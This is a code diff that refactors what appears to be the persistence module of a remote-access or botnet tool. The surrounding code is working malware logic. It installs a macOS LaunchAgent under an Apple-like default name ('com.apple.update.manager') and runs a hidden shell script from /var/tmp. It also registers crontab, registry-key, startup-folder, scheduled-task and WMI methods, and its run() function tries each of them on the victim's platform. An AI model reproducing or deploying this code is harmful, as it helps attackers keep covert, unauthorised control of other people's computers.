@@ -67,9 +67,9 @@ echo '<plist version="1.0">
 <key>AbandonProcessGroup</key>
 <true/>
 </dict>
-</plist>' > ~/Library/LaunchAgents/com.apples.__LABEL__.plist
-chmod 600 ~/Library/LaunchAgents/com.apples.__LABEL__.plist
-launchctl load ~/Library/LaunchAgents/com.apples.__LABEL__.plist
+</plist>' > ~/Library/LaunchAgents/__LABEL__.plist
+chmod 600 ~/Library/LaunchAgents/__LABEL__.plist
+launchctl load ~/Library/LaunchAgents/__LABEL__.plist
 exit"""
 
 # main
@@ -159,14 +159,14 @@ def _add_launch_agent(value=None, name='com.apple.update.manager'):
                 else:
                     raise ValueError('No target file selected')
             if value and os.path.isfile(value):
-                label   = name
+                label = name
                 if not os.path.exists('/var/tmp'):
                     os.makedirs('/var/tmp')
-                fpath   = '/var/tmp/.{}.sh'.format(name)
-                bash    = globals()['__Template_plist'].replace('__LABEL__', label).replace('__FILE__', value)
+                fpath = '/var/tmp/.{}.sh'.format(name)
+                bash = globals()['__Template_plist'].replace('__LABEL__', label).replace('__FILE__', value)
                 with file(fpath, 'w') as fileobj:
                     fileobj.write(bash)
-                bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                bin_sh = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                 time.sleep(1)
                 launch_agent= '~/Library/LaunchAgents/{}.plist'.format(label)
                 if os.path.isfile(launch_agent):
@@ -353,14 +353,15 @@ def _remove_startup_file():
     except Exception as e:
         util.log('{} error: {}'.format(_remove_startup_file.func_name, str(e)))
 
-hidden_file    = Method('hidden_file', platforms=['win32','linux2','darwin'])
+hidden_file = Method('hidden_file', platforms=['win32','linux2','darwin'])
+crontab_job = Method('crontab_job', platforms=['linux2'])
+registry_key = Method('registry_key', platforms=['win32'])
+startup_file = Method('startup_file', platforms=['win32'])
+launch_agent = Method('launch_agent', platforms=['darwin'])
 scheduled_task = Method('scheduled_task', platforms=['win32'])
-registry_key   = Method('registry_key',   platforms=['win32'])
-startup_file   = Method('startup_file',   platforms=['win32'])
-launch_agent   = Method('launch_agent',   platforms=['darwin'])
-crontab_job    = Method('crontab_job',    platforms=['linux2'])
 powershell_wmi = Method('powershell_wmi', platforms=['win32'])
 
+_methods = {method: globals()[method] for method in globals() if isinstance(globals()[method], Method)}
 
 def methods():
     """
@@ -376,7 +377,7 @@ def methods():
     :attr str result:          method result output
 
     """
-    return {method: globals()[method] for method in globals() if isinstance(globals()[method], Method)}
+    return globals()['_methods'].items()
 
 def results():
     """ 
@@ -385,14 +386,14 @@ def results():
     Ex. {"method": "result", ...}
 
     """
-    return {name: method.result for name, method in methods().items() if method.established}
+    return {name: method.result for name, method in globals()['_methods'].items() if method.established}
 
 def run():
     """
     Attempt to establish persistence with every method
 
     """
-    for name, method in methods().items():
+    for name, method in globals()['_methods'].items():
         if sys.platform in method.platforms:
             try:
                 method.add()
@@ -405,7 +406,7 @@ def abort():
     Remove all established persistence methods
 
     """
-    for name, method in methods().items():
+    for name, method in globals()['_methods'].items():
         if sys.platform in method.platforms:
             try:
                 method.remove()
